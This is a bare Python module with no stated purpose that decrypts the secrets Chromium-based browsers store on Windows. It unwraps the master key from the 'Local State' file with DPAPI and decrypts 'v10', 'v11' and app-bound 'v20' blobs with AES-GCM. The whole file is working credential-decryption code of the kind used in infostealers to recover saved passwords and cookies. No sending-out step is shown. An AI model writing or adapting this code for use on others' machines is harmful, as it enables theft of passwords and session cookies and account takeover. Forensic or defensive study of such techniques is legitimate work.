import base64
import json

import win32crypt
from Crypto.Cipher import AES


def dpapi(data):
    try:
        return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1]
    except Exception:
        return None


def aes_gcm(key, data):
    if len(data) < 31:
        return None
    try:
        nonce = data[3:15]
        payload = data[15:]
        c = AES.new(key, AES.MODE_GCM, nonce=nonce)
        plain = c.decrypt_and_verify(payload[:-16], payload[-16:])
        if len(plain) > 32:
            head, rest = plain[:32], plain[32:]
            nh = sum(1 for b in head if b < 0x20 or b > 0x7E)
            nr = sum(1 for b in rest[:64] if b < 0x09 or 0x0E <= b <= 0x1F)
            if nh > 8 and nr < 4:
                return rest
        return plain
    except Exception:
        return None


def read_local_state(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            ls = json.load(f)
        enc = base64.b64decode(ls["os_crypt"]["encrypted_key"])
        if enc[:5] != b"DPAPI":
            return None
        return dpapi(enc[5:])
    except Exception:
        return None


def decrypt(blob, mk, abk):
    if not blob:
        return ""
    p = blob[:3]
    if p == b"v20":
        if abk:
            r = aes_gcm(abk, blob)
            if r is not None:
                return r.decode("utf-8", errors="replace")
        return "[v20-no-abk]"
    if p in (b"v10", b"v11"):
        if mk:
            r = aes_gcm(mk, blob)
            if r is not None:
                return r.decode("utf-8", errors="replace")
        return "[v10-fail]"
    r = dpapi(blob)
    if r is not None:
        return r.decode("utf-8", errors="replace")
    return "[dpapi-fail]"